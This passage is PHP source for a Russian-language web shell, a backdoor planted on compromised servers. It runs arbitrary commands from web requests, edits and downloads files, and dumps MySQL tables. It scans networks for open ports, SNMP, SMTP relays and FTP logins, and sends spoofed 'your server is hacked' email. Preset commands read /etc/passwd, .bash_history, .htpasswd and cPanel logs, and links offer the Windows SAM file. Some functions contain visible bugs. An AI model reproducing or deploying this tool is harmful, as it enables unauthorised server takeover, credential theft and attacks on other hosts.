$res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 

$row = mysql_fetch_row($res); 

fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");

fputs($fp, $row[1].";\n\n");   

fclose($fp); 

$dump_file=file($file);

print "<br><table bgcolor=#181818 width=99% cellpadding=0 cellspacing=1 border=1><tr><td><table width=100% cellpadding=2 bgcolor=#181818>";

foreach ($dump_file as $k=>$v){$v=str_replace("\n","<br>",$v);print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";}

print "</table></td></tr></table><br>";

unlink($file);

}

if ($_REQUEST['strukt']=='d_strukt' && $_REQUEST['send']=='send_br'){

$host = $HTTP_SERVER_VARS["SERVER_NAME"];

$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];

mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");

$fp = fopen($file, "w"); 

fputs ($fp, "# Host settings:\n# $host ($ip)\n # MySQL version: (".mysql_get_server_info().")\n# Date: ".

date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 

$res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 

$row = mysql_fetch_row($res); 

fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");

fputs($fp, $row[1].";\n\n"); 

$res = mysql_query("SELECT * FROM `$tbl`", $connection); 

if (mysql_num_rows($res) > 0) { 

while ($row = mysql_fetch_assoc($res)) { 

$keys = implode("`, `", array_keys($row)); 

$values = array_values($row); 

foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 

$values = implode("', '", $values); 

$sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 

fputs($fp, $sql); 

} 

}

fclose($fp); 

$dump_file=file($file);

print "<br><table bgcolor=#181818 width=99% cellpadding=0 cellspacing=1 border=1><tr><td><table width=100% cellpadding=2 bgcolor=#181818>";

foreach ($dump_file as $k=>$v){$v=str_replace("\n","<br>",$v);print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";}

print "</table></td></tr></table><br>";

unlink($file);

}

if ($_REQUEST['strukt']=='d' && $_REQUEST['send']=='send_br'){

$host = $HTTP_SERVER_VARS["SERVER_NAME"];

$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];

mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");

$fp = fopen($file, "w"); 

$res = mysql_query("SELECT * FROM `$tbl`", $connection); 

if (mysql_num_rows($res) > 0) { 

while ($row = mysql_fetch_assoc($res)) { 

$keys = implode("`, `", array_keys($row)); 

$values = array_values($row); 

foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 

$values = implode("', '", $values); 

$sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 

fputs($fp, $sql); 

} 

}

fclose($fp); 

$dump_file=file($file);

print "<br><table bgcolor=#181818 width=99% cellpadding=0 cellspacing=1 border=1><tr><td><table width=100% cellpadding=2 bgcolor=#181818>";

foreach ($dump_file as $k=>$v){$v=str_replace("\n","<br>",$v);print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";}

print "</table></td></tr></table><br>";

unlink($file);

}

print "

</td>

</tr>

</table>

</td>

</tr>

</table>";

}

if (isset($q_help) && $q_help=='ok'){

print 'Мини HELP по запросам

<li><b>SHOW TABLES </b> выводит список таблиц базы

<li><b>SHOW OPEN TABLES</b> выводит список таблиц, которые в настоящий момент открыты в кэше таблицы

<li><b>SHOW TABLE STATUS</b> структура таблиц базы

<li><b>SELECT VERSION(), CURRENT_DATE</b> выводит версию MySQL сервера и текущую дату

<li><b>SELECT (2*2), (4+1)*5, (9/3), (5-3)</b> используем MySQL как калькулятор: указываем через запятую арифметические операции

<li><b>DROP TABLE IF EXISTS table_name</b> удалить таблицу \"table_name\"

<li><b>CREATE TABLE bar (m INT)</b> создать таблицу bar с одним столбцом (m) типа integer

<li><b>CREATE TABLE test (number INTEGER,texts CHAR(10));</b> создать таблицу test с полями number -тип INTEGER и поле texts -тип CHAR

<li><b>CREATE TABLE `test` SELECT * FROM `rush`;</b> создать таблицу test ,копируя таблицу rush

<li><b>ALTER TABLE test CHANGE SITE OLD_SITE INTEGER</b> переименовать столбец INTEGER из SITE в OLD_SITE

<li><b>ALTER TABLE test RENAME rush</b> переименовать таблицу test в rush

<li><b>UPDATE mysql.user SET Password=PASSWORD(\'new_passwd\') WHERE user=\'root\'</b> сменить юзеру root пароль

<li><b>FLUSH PRIVILEGES</b> перечитать таблицу привилегий юзеров

<li><b>GRANT ALL PRIVILEGES ON *.* TO xXx@localhost IDENTIFIED BY \'some_pass\' WITH GRANT OPTION</b> добавить нового супер-юзера mysql <b>xXx</b> с паролем <b>some_pass</b>

';

}

print "

</td>

</tr>

</table>

</td></tr>

<tr><td>

<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#181818>

<tr><td>

<table align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#181818>

<tr>

<td align=center>

&nbsp;

</td>

</tr>

</table> 

</td></tr>

</table>

</td></tr></table>";

exit();

}

function icon($file) {

$ext=get_file_ext($file);

if (getimagesize($file) != NULL) { $icon="img"; }

elseif (is_dir($file)) { $icon="dir"; }

elseif ($ext == "htm" || $ext == "html" || $ext == "mhtml") { $icon="html"; }

elseif ($ext == "php" || $ext == "php3" || $ext == "php4" || $ext == "php5" || $ext == "phtml") { $icon="php"; }

elseif ($ext == "exe" || $ext == "com" || $ext == "bat") { $icon="exe"; }

elseif ($ext == "htaccess" || $ext == "txt" || $ext == "htpasswd" || $ext == "dat" || $ext == "log" || $ext == "ini" || $ext == "inf" || $ext == "inc" || $ext == "sql" || $ext == "rtf" || $ext == "doc") { $icon="txt"; }

else { $icon="unk"; }

return "<img src=\"".$_SERVER['PHP_SELF']."?act=img&amp;name_img=".$icon."\" />&nbsp;";

}

function flusher(){ flush(); ob_flush(); }

if (!function_exists("file_get_contents")) {

function file_get_contents($addr) {

$a = fopen($addr,"r");

$tmp = fread($a,filesize($a));

fclose($a);

if($a)return $tmp;

}

}

if (!function_exists("file_put_contents")) {

function file_put_contents($addr,$con) {

$a = fopen($addr,"w");

if(!$a)return 0;

fwrite($a,$con);

fclose($a);

return strlen($con);

}

}

if (!function_exists("str_repeat")) {

function str_repeat($str,$c){

$r="";

for($i=0; $i < $cu; $i++)$r.=$str;

return $r;

}

}

if (!empty($dl)) {

ob_clean();

$con=file_get_contents($dl);

header("Content-type: application/octet-stream");

header("Content-disposition: attachment; filename=\"$dl\";");

header("Content-length: ".strlen($con));

echo $con;

exit;

}

if (!empty($img)) {

header("Content-type: image/gif");

header("Content-length: ".filesize($img));

header("Last-Modified: ".date("r",filemtime($img)));

echo file_get_contents($img);

exit;

}

function showsize($size) {

if ($size>=1073741824) { $size = round(($size/1073741824) ,2)." ГБ"; }

elseif ($size>=1048576) { $size = round(($size/1048576),2)." МБ"; }

elseif ($size>=1024) { $size = round(($size/1024),2)." КБ"; }

else { $size .= " B"; }

return $size;

}

if (substr((strtoupper(php_uname())),0,3)=="WIN") { $windows=1; } else { $windows=0; }

function name(){

$name='';

srand((double)microtime()*100000);

for ($i=0;$i<=rand(3,10);$i++){

$name.=chr(rand(97,122));

}

return $name;

}

function whereistmp() {

$uploadtmp=ini_get('upload_tmp_dir');

$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');

if(is_dir('/tmp') && is_writable('/tmp')) { return '/tmp'; }

if(is_dir('/usr/tmp') && is_writable('/usr/tmp')) { return '/usr/tmp'; }

if(is_dir('/var/tmp') && is_writable('/var/tmp')) { return '/var/tmp'; }

if(is_dir($uploadtmp) && is_writable($uploadtmp)) { return $uploadtmp; }

if(is_dir($envtmp) && is_writable($envtmp)) { return $envtmp; }

return ".";

}

function shell($command){

global $windows,$disablefunctions;

$exec = '';$output= '';

$dep[]=array('pipe','r');$dep[]=array('pipe','w');

if(is_callable('passthru') && !strstr($disablefunctions,'passthru')){ @ob_start();passthru($command);$exec=@ob_get_contents();@ob_clean();@ob_end_clean();}

elseif(is_callable('system') && !strstr($disablefunctions,'system')){$tmp = @ob_get_contents(); @ob_clean();system($command) ; $output = @ob_get_contents(); @ob_clean(); $exec= $tmp; }

elseif(is_callable('exec') && !strstr($disablefunctions,'exec')) {exec($command,$output);$output = join("\n",$output);$exec= $output;}

elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}

elseif(is_resource($output=popen($command,"r"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}

elseif(is_resource($res=proc_open($command,$dep,$pipes))){while(!feof($pipes[1])){$line = fgets($pipes[1]); $output.=$line;}$exec= $output;proc_close($res);}

elseif ($windows && is_object($ws = new COM("WScript.Shell"))){$dir=(isset($_SERVER["TEMP"]))?$_SERVER["TEMP"]:ini_get('upload_tmp_dir') ;$name = $_SERVER["TEMP"].name();$ws->Run("cmd.exe /C $command >$name", 0, true);$exec = file_get_contents($name);unlink($name);}

else { $exec="Sorry, you can not execute commands on this server."; }

$exec=convert_cyr_string ($exec, "a", "w");

return $exec;

}

function downloadit($get,$put){

$fo=strtolower(ini_get('allow_url_fopen'));

if($fo || $fo=='on') { $con=file_get_contents($get); }

else {

$u=parse_url($get);

$host=$u['host']; $file==(!empty($u['path']))?$u['path']:'/';

$url=fsockopen($host, 80, $en, $es, 12);

fputs($url, "GET $file HTTP/1.0\r\nAccept-Encoding: */*\r\nHost: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");

$tmp=$con='';

while($tmp!="\r\n") { $tmp=fgets($url); }

while(!feof($url)) { $con.=fgets($url); }

}

$mk=file_put_contents($put,$con);

if($mk) { return 1; }

return 0;

}

function smtplogin($addr,$user,$pass,$timeout){

$sock=fsockopen($addr,25,$n,$s,$timeout);

if(!$sock) { return -1; }

fputs($sock,'HELO '.name()."\r\n");

$res=fgets($res,3);

if($res!='220') { return 0; }

fputs($sock,"auth login\r\n");

$res=fgets($res,3);

if($res!='220') { return 0; }

fputs($sock,base64_encode($user)."\r\n");

$res=fgets($res,3);

if($res!='220') { return 0; }

fputs($sock,base64_encode($pass)."\r\n");

$res=fgets($res,3);

if($res!='220') { return 0; }

return 1;

}

function checksmtp($host,$timeout){

if (!fsockopen($host,25,$n,$s,$timeout)) { return 0; }

return 1;

}

function check_url($url,$timeout){

$u=parse_url($url);

$host=$u['host'];

$file=(!empty($u['path']))?$u['path']:'/';

$sock=fsockopen($host,80,$en,$es,$timeout);

if($sock){

fputs($sock,"GET $file HTTP/1.0\r\n");

fputs($sock,"Host: $host\r\n\r\n");

$res=substr(fgets($sock,12),9);

if($res=='20') { return 1; }

}

return 0;

}

function get_sw_name($host,$timeout){

$sock=fsockopen($host,80,$en,$es,$timeout);

if($sock){

$page=name().name();

fputs($sock,"GET /$page HTTP/1.0\r\n\r\n");

while(!feof($sock)) {

$con=fgets($sock); 

if(strstr($con,'Server:')) {$ser=substr($con,strpos($con,' ')+1); return $ser;}

} fclose($sock); return -1; } return 0;

}

function snmpcheck($ip,$com,$timeout) {

$res="";

$packet = "0&".chr(2).chr(1).chr(0).chr(4).chr(strlen($com)).$com.chr(160).chr(25).chr(2).chr(1)."/".chr(2).chr(1).chr(0).chr(2).chr(1).chr(0)."0".chr(14)."0".chr(12).chr(6).chr(8)."+".chr(6).chr(1).chr(2).chr(1).chr(1).chr(2).chr(0).chr(5).chr(0);

$sock = fsockopen("udp://$ip",161);

socket_set_timeout($sock,$timeout);

fputs($sock,$packet);

socket_set_timeout($sock,$timeout);

$res = fgets($sock);

fclose($sock);

return $res;

}

$safemode=(ini_get('safe_mode') or strtolower(ini_get('safe_mode')) == 'on')?'ON':'OFF';

if($safemode=="ON") { ini_restore("safe_mode"); ini_restore("open_basedir"); }

function showimage($img) { echo "<center><img border=0 src=\"".hlink("image=".$img."&&workingdir=".getcwd())."\"></center>"; }

function editor($file){

global $errorbox,$et,$hcwd;

if (is_file($file)) {

if (!is_readable($file)) { echo $errorbox." Файл не доступен для чтения".$et."<br>"; }

if (!is_writable($file)){ echo $errorbox." Файл не доступен для записи".$et."<br>"; }

$data = file_get_contents($file);

echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><td><form method=\"POST\">".$hcwd."<input type=text value=\"".htmlspecialchars($file)."\" size=75 name=file><input type=submit class=buttons name=Open value=Открыть></td></tr></form></table><br><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><td><form method=\"POST\"><textarea rows=\"18\" name=\"edited\" cols=\"64\">";

echo htmlspecialchars($data);

echo "</textarea></td></tr><tr><td><input type=text value=\"".$file."\" size=80 name=file></td></tr><td>";

} else {

echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><td><form method=\"POST\"><input type=text value=\"".getcwd()."\" size=75 name=file>".$hcwd."<input type=submit class=buttons name=Open value=Открыть></td></tr></form></table><br><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><td><form method=\"POST\"><textarea rows=\"18\" name=\"edited\" cols=\"63\"></textarea></td></tr><tr><td><input type=text value=\"".getcwd()."\" size=80 name=file></td></tr><td>";

}

echo $hcwd."<input type=submit class=buttons name=save value=Сохранить></td></form></tr></table></center>";

}

function webshell() {

global $windows,$hcwd;

if($windows) {

$alias="<option value=\"netstat -an\">Показать открытые порты</option><option value=\"tasklist\">Список процессов</option><option value=\"systeminfo\">Инфо о системе</option><option value=\"ipconfig /all\">Конфигурация IP</option><option value=\"getmac\">Узнать MAC адрес</option><option value=\"net start\">Список служб</option><option value=\"net view\">Другие компы в сети</option><option value=\"net user\">Список юзеров</option><option value=\"gpresult\">Group policy</option><option value=\"shutdown -s -f -t 1\">Вырубить сервер</option>";

} else {

$alias="<option value=\"netstat -an | grep -i listen\">Показать открытые порты</option><option value=\"last -a -n 250 -i\">Показать последних 250 залогинившихся юзеров</option><option value=\"which wget curl lynx w3m\">Качалки</option><option value=\"find / -perm -2 -type d -print\">Найти расшаренные папки</option><option value=\"find . -perm -2 -type d -print\">Найти расшаренные папки в текущей</option><option value=\"find / -perm -2 -type f -print\">Найти расшаренные файлы</option><option value=\"find . -perm -2 -type f -print\">Найти расшаренные файлы в текущйе папке</option><option value=\"find / -type f -perm 04000 -ls\">Найти файлы с битом SUID</option><option value=\"find / -type f -perm 02000 -ls\">Найти файлы с битом SGID</option><option value=\"find / -name .htpasswd -type f\">Найти файлы .htpasswd</option><option value=\"find / -type f -name .bash_history\">Найти файлы .bash_history</option><option value=\"cat /etc/syslog.conf\">Показать syslog.conf</option><option value=\"cat cat /etc/hosts\">Показать файл hosts</option><option value=\"ps auxw\">Список процессов</option>";

if(is_dir('/etc/valiases')) { $alias.="<option value=\"ls -l /etc/valiases\">Список доменов Cpanel (valiases)</option>"; }

if(is_dir('/etc/vdomainaliases')) { $alias.="<option value=\"ls -l /etc/vdomainaliases\">Список доменов Cpanel (vdomainaliases)</option>"; }

if(file_exists('/var/cpanel/accounting.log')) { $alias.="<option value=\"cat /var/cpanel/accounting.log\">Лог Cpanel</option>"; }

if(is_dir('/var/spool/mail/')) { $alias.="<option value=\"ls /var/spool/mail/\">Список почтовых ящиков</option>"; }

}

echo "<center><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"65%\"><form method=\"POST\"><tr><td width=\"20%\"><b>Путь:</b><input type=text name=workingdir size=82 value=\"".getcwd()."\"><input class=buttons type=submit value=Изменить></td></tr></form></table><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"65%\"><tr><td><b>Web Shell:</b></td></tr><td><textarea rows=\"22\" cols=\"78\">";

if (!empty($_REQUEST['cmd'])) { echo shell($_REQUEST['cmd']); }

echo "</textarea></td></tr><form method=post><tr><td><input type=text size=91 name=cmd value=\"";

if (!empty($_REQUEST['cmd'])) { echo htmlspecialchars(($_REQUEST['cmd'])); }

elseif(!$windows) {

echo "cat /etc/passwd"; }

echo "\">".$hcwd."<input class=buttons type=submit value=Выполнить></td></tr></form></td></tr><form method=post><tr><td><select name=\"cmd\" width=70>".$alias."</select>".$hcwd."<input class=buttons type=submit value=Выполнить></td></tr></form></table></table><center>";

}

function mailer(){

global $msgbox,$et,$hcwd;

$cwd=getcwd();

if (!empty($_REQUEST['subject']) && !empty($_REQUEST['body']) && !empty($_REQUEST['from']) && !empty($_REQUEST['to'])) {

$to=$_REQUEST['to'];

$from=$_REQUEST['from'];

$subject=$_REQUEST['subject'];

$body=$_REQUEST['body'];

if (!mail($to,$subject,$body,"From: $from")) { break; }

echo $msgbox."<b>Письмо отправлено!</b><br>".$et;

}

echo "<center><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><form method=\"POST\"><td><b>Мейлер:</b></td></tr><td width=\"20%\">SMTP</td><td>".ini_get('SMTP')." (".ini_get('smtp_port').")</td></tr><tr><td>От:</td><td><input name=from type=text value=\"\" size=55>".$hcwd."</td><tr><td width=\"25%\">To:</td><td><input name=to type=text value=\"";

if (!empty($_REQUEST['to'])) { echo htmlspecialchars($_REQUEST['to']); }

elseif(!empty($_ENV["SERVER_ADMIN"])) { echo $_ENV["SERVER_ADMIN"]; }

else { echo "admin@".getenv('HTTP_HOST'); }

echo "\" size=55></td></tr><tr><td>Тема:</td><td><input name=subject type=text value=\"ВАШ СЕРВЕР ВЗЛОМАН :-P\" size=55></td><tr><td>Сообщение:</td><td><textarea rows=\"18\" cols=\"43\" name=body>Ваша система взломана!</textarea></td></tr><tr><td width=\"10%\"></td><td align=\"right\"><input type=submit class=buttons value=Послать></form>".$et;

}

function scanner(){

global $hcwd;

if (!empty($_SERVER["SERVER_ADDR"])) { $host=$_SERVER["SERVER_ADDR"]; } else { $host ="127.0.0.1"; }

if (!empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])){

$target=$_REQUEST['target']; $from=(int) $_REQUEST['fromport']; $to=(int)$_REQUEST['toport']; $timeout=(int)$_REQUEST['timeout']; $nu = 0;

echo "<font color=blue>Начато сканирование портов ".htmlspecialchars($target).":<br>";

for($i=$from;$i<=$to;$i++){

$scan=checkthisport($target,$i,$timeout);

if ($scan){

$nu++;

$ser="";

if(getservbyport($i,"tcp")) { $ser="(".getservbyport($i,"tcp").")"; }

echo $nu.") ".$i." ".$ser." (<a href=\"telnet://".$target.":".$i."\">Подключиться</a>)<br>";

}

flusher();

}

echo "Готово!</font>";

}

elseif (!empty($_REQUEST['securityscanner'])){

echo "<font color=blue>";

if(!empty($_REQUEST['httpscanner'])){ flusher(); }

$from=$_REQUEST['from'];

$to=(int)$_REQUEST['to'];

$timeout=(int)$_REQUEST['timeout'];

$f = substr($from,strrpos($from,".")+1);

$from = substr($from,0,strrpos($from,"."));

for($i=$f;$i<=$to;$i++){

$output=0;

$ip=$from.$i;

if(!empty($_REQUEST['ipscanner'])){

$port=$_REQUEST['port'];

if(strstr($port,",")) { $p=explode(",",$port); } else { $p[0]=$port; }

$open=$ser="";

foreach($p as $po){

$scan=checkthisport($ip,$po,$timeout);

if ($scan){

$ser="";

if($ser=getservbyport($po,"tcp"))$ser="(".$ser.")";

$open.=" ".$po.$ser." ";

}

}

if($open){ echo $ip.") Открытые порты:".$open."<br>"; $output=1; }

flusher();

}

if(!empty($_REQUEST['httpbanner'])){

$res=get_sw_name($ip,$timeout);

if($res){

echo $ip.") ПО веб-сервера: ";

if($res==-1) { echo "Неизвестно"; }

else { echo $res; }

echo "<br>";

$output=1;

}

flusher();

}

if(!empty($_REQUEST['httpscanner'])){

$scan=checkthisport($ip,80,$timeout);

if($scan && $dl){

$file=file($buglist);

foreach ($file as $v){

$v=trim($v);

$url="http://".$ip.$v;

$res=check_url($url,$timeout);

if($res) { $output=1; echo $ip.")<b><a href=\"".$url."\" target=\"_blank\">".$url."</a></b><br>";}

flusher();

}

$file=array();

}

}

if(!empty($_REQUEST['smtprelay'])){

$res='';

$res=checksmtp($ip,$timeout);

if($res==1){ echo $ip.") SMTP релей найден.<br>"; $output=1; } flusher();

}

if(!empty($_REQUEST['snmpscanner']) && function_exists('socket_set_timeout')){

$com=$_REQUEST['com'];

$coms=$res="";

if(strstr($com,",")) { $c=explode(",",$com); } else { $c[0]=$com; }

foreach ($c as $v){

$ret=snmpcheck($ip,$v,$timeout);

if ($res!="") { $coms .=" $v "; }

}

if ($coms!=""){ echo "<b>".$ip.") SNMP найден: ".$coms."</b><br>"; $output=1;}

flusher();

}

if(!empty($_REQUEST['ftpscanner'])){

$user=$_REQUEST['user'];

$pass=$_REQUEST['pass'];

$ftp=ftp_connect($ip,21,$timeout);

if ($ftp) {

if(ftp_login($ftp,$user,$pass)){ $output=1;echo "<b>".$ip.") FTP найден: <a href=\"ftp://".$ip."\" target=\"_blank\">".$ip."</a> Вход: успешный Система: ".ftp_systype($ftp)."</b><br>";};

}

flusher();

}

if($output) { echo "<br>"; }

flusher();

}

echo "</font>";

}else{

echo "<center><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><form method=\"POST\"><td>Сканер портов:</td></tr><td width=\"25%\">Цель:</td><td width=80%><input name=target value=".$host." size=40></td></tr><tr><td width=25%>От:</td><td width=25%><input name=fromport type=text value=\"1\" size=5></td></tr><tr><td width=25%>До:</td><td width=25%><input name=toport type=text value=\"1024\" size=5></td></tr><tr><td width=\"25%\">Таймаут:</td><td><input name=timeout type=text value=\"2\" size=5></td><tr><td width=\"25%\"></td><td align=\"right\">".$hcwd."<input type=submit class=buttons name=portscanner value=Скан></td></tr></form></table>";

$host = substr($host,0,strrpos($host,"."));

echo "<br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><form method=\"POST\" name=security><td>Сканер безопасности:</td></tr><td width=\"25%\">От:</td><td width=80%><input name=from value=".$host.".1 size=40></td></tr><tr><td width=25%>До:</td><td width=25%>xxx.xxx.xxx.<input name=to type=text value=254 size=4>".$hcwd."</td></tr><tr><td width=\"25%\">Таймаут:</td><td><input name=timeout type=text value=\"2\" size=5></td></tr><tr><td width=\"25%\"><input type=checkbox name=ipscanner value=1 checked onClick=\"document.security.port.disabled = !document.security.port.disabled;\" style=\"border-width:1px;\">Сканер портов:</td><td><input name=port type=text value=\"21,23,25,80,110,135,139,1433,3306,3389\" size=60></td></tr><tr><td width=\"25%\"><input type=checkbox name=httpbanner value=1 checked style=\"border-width:1px;\">Получить веб-баннер</td><td><input type=checkbox name=httpscanner value=1 checked style=\"border-width:1px;\">Сканер безопасности веб-сервера&nbsp;&nbsp;&nbsp;<input type=checkbox name=smtprelay value=1 checked style=\"border-width:1px;\">Проверка SMTP релея</td></tr><tr><td width=\"25%\"><input type=checkbox name=ftpscanner value=1 checked onClick=\"document.security.user.disabled = !document.security.user.disabled;document.security.pass.disabled = !document.security.pass.disabled;\" style=\"border-width:1px;\">FTP пароль:</td><td>Юзер:<input name=user type=text value=\"anonymous\" size=20>  Пароль:<input name=pass type=text value=\"admin@\" size=20></td></tr><tr><td width=\"25%\"><input type=checkbox name=snmpscanner value=1 onClick=\"document.security.com.disabled = !document.security.com.disabled;\" checked style=\"border-width:1px;\">SNMP:</td><td><input name=com type=text value=\"public,private\" size=60></td></tr><tr><td width=\"25%\"></td><td align=\"right\"><input type=submit class=buttons name=securityscanner value=Скан></td></tr></form></table></center><br><center>";

}

}

function sysinfo(){

global $windows,$disablefunctions,$safemode;

$cwd= getcwd();

$mil="<a target=\"_blank\" href=\"http://www.milw0rm.org/related.php?program=";

$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";

if (!empty($_SERVER["PROCESSOR_IDENTIFIER"])) { $CPU = $_SERVER["PROCESSOR_IDENTIFIER"]; }

$osver=$tsize=$fsize='';

if ($windows){ 

$osver = "  (".shell("ver").")";

$sysroot = shell("echo %systemroot%");

if (empty($sysroot)) { $sysroot = $_SERVER["SystemRoot"]; }

if (empty($sysroot)) { $sysroot = getenv("windir"); }

if (empty($sysroot)) { $sysroot = "Не найден"; }

if (empty($CPU)) { $CPU = shell("echo %PROCESSOR_IDENTIFIER%"); }

for ($i=66;$i<=90;$i++){

$drive= chr($i).':\\';

if (is_dir($drive)){

$fsize+=disk_free_space($drive);

$tsize+=disk_total_space($drive);

}

}

}else{

$fsize=disk_free_space('/');

$tsize=disk_total_space('/');

}

$disksize="Занято: ". showsize($tsize-$fsize) . "   Свободно: ". showsize($fsize) . "   Всего: ". showsize($tsize);

if (empty($CPU)) $CPU = "Неизвестный";

$os = php_uname();

$osn=php_uname('s');

if(!$windows){ 

$ker = php_uname('r');

$o=($osn=="Linux")?"Linux+Kernel":$osn;

$os = str_replace($osn,"${mil}$o\">$osn</a>",$os);

$os = str_replace($ker,"${mil}Linux+Kernel\">$ker</a>",$os);

$inpa=':';

}else{

$sam = $sysroot."\\system32\\config\\SAM";

$inpa=';';

$os = str_replace($osn,"${mil}MS+Windows\">$osn</a>",$os);

}

$software=str_replace("Apache","${mil}Apache\">Apache</a>",$_SERVER['SERVER_SOFTWARE']);

echo "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><tr><td>Инфо о сервере:</td></tr><tr><td width=\"25%\">Сервер:</td><td>".$_SERVER["HTTP_HOST"];

if (!empty($_SERVER["SERVER_ADDR"])){ echo "(". $_SERVER["SERVER_ADDR"] .")"; }

echo "</td></tr><tr><td width=\"25%\">ОС:</td><td>".$os.$osver."</td></tr><tr><td width=\"25%\">Приложение:</td><td>".$software."</td></tr><tr><td width=\"25%\">Процессор:</td><td>".$CPU."</td></tr><td width=\"25%\">Состояние памяти:</td><td>".$disksize."</td></tr><tr><td width=\"25%\">Домен пользователя:</td><td>";

if (!empty($_SERVER['USERDOMAIN'])) { echo $_SERVER['USERDOMAIN']; } else { echo "Неизвестный"; }

echo "</td></tr><tr><td width=\"25%\">User name:</td><td>";

$cuser=get_current_user();

if (!empty($cuser)) { echo get_current_user(); } else { echo "Неизвестный"; }

echo "</td></tr>";

if ($windows){

echo "<tr><td width=\"25%\">Папка Windows:</td><td><a href=\"".hlink("sec=fm&workingdir=".$sysroot)."\">".$sysroot."</a></td></tr><tr><td width=\"25%\">Sam файл:</td><td>";

if (is_readable(($sam))) { echo "<a href=\"".hlink("?workingdir=".$sysroot."\\system32\\config&download=sam")."\">Читаемый</a>"; }

else { echo "Нечитаемый"; }

echo "</td></tr>";

}else{

echo "<tr><td width=\"25%\">Файл с паролями:</td><td>";

if (is_readable('/etc/passwd')) { echo "<a href=\"".hlink("sec=edit&file=/etc/passwd&workingdir=".$cwd)."\">Читаемый</a>"; }

else { echo'Нечитаемый'; }

echo "</td></tr><tr><td width=\"25%\">Лог Cpanel:</td><td>";

if (file_exists("/var/cpanel/accounting.log")){

if (is_readable("/var/cpanel/accounting.log")) { echo "<a href=\"".hlink("sec=edit&file=/var/cpanel/accounting.log&workingdir=".$cwd)."\">Читаемый</a>"; }

else { echo "Не читаемый"; }

}else{

echo "Не найден";

}

echo "</td></tr>";

}

$uip =(!empty($_SERVER['REMOTE_ADDR']))?$_SERVER['REMOTE_ADDR']:getenv('REMOTE_ADDR');

echo "<tr><td width=\"25%\">${mil}PHP\">PHP</a> версия:</td><td><a href=\"?=".php_logo_guid()."\" target=\"_blank\">".PHP_VERSION."</a> (<a href=\"".hlink("sec=phpinfo&workingdir=$cwd")."\">подробнее...</a>)</td></tr><tr><td width=\"25%\">Версия Zend:</td><td>";

if (function_exists('zend_version')) { echo "<a href=\"?=".zend_logo_guid()."\" target=\"_blank\">".zend_version()."</a>"; }

else { echo "Не найден"; }

echo "</td><tr><td width=\"25%\">Include path:</td><td>".str_replace($inpa," ",DEFAULT_INCLUDE_PATH)."</td><tr><td width=\"25%\">PHP модули:</td><td>";

$ext=get_loaded_extensions();

foreach($ext as $v) { echo $v." "; }

echo "</td><tr><td width=\"25%\">Запрещённые функции:</td><td>";

if(!empty($disablefunctions)) { echo $disablefunctions; }

else { echo "Нет"; }

echo"</td></tr><tr><td width=\"25%\">Безопасный режим:</td><td>".$safemode."</td></tr><tr><td width=\"25%\">Open base dir:</td><td>".$basedir."</td></tr><tr><td width=\"25%\">БД:</td><td>";$sq="";

if(function_exists('mysql_connect')) { $sq= "${mil}MySQL\">MySQL</a> "; }

if(function_exists('mssql_connect')) { $sq.= " ${mil}MSSQL\">MSSQL</a> "; }

if(function_exists('ora_logon')) { $sq.= " ${mil}Oracle\">Oracle</a> "; }

if(function_exists('sqlite_open')) { $sq.= " SQLite "; }

if(function_exists('pg_connect')) { $sq.= " ${mil}PostgreSQL\">PostgreSQL</a> "; }

if(function_exists('msql_connect')) { $sq.= " mSQL "; }

if(function_exists('mysqli_connect')) { $sq.= " MySQLi "; }

if(function_exists('ovrimos_connect')) { $sq.= " Ovrimos SQL "; }

if (empty($sq)) { $sq= "Нет"; }

echo $sq."</td></tr>";

if(function_exists('curl_init')) { echo "<tr><td width=\"25%\">Поддержка cURL:</td><td>Есть "; }

if(function_exists('curl_version')) { $ver=curl_version(); echo "(Версия:". $ver['version']." OpenSSL версия:". $ver['ssl_version']." zlib версия:". $ver['libz_version']." host:". $ver['host'] .")"; }

echo "</td></tr>";

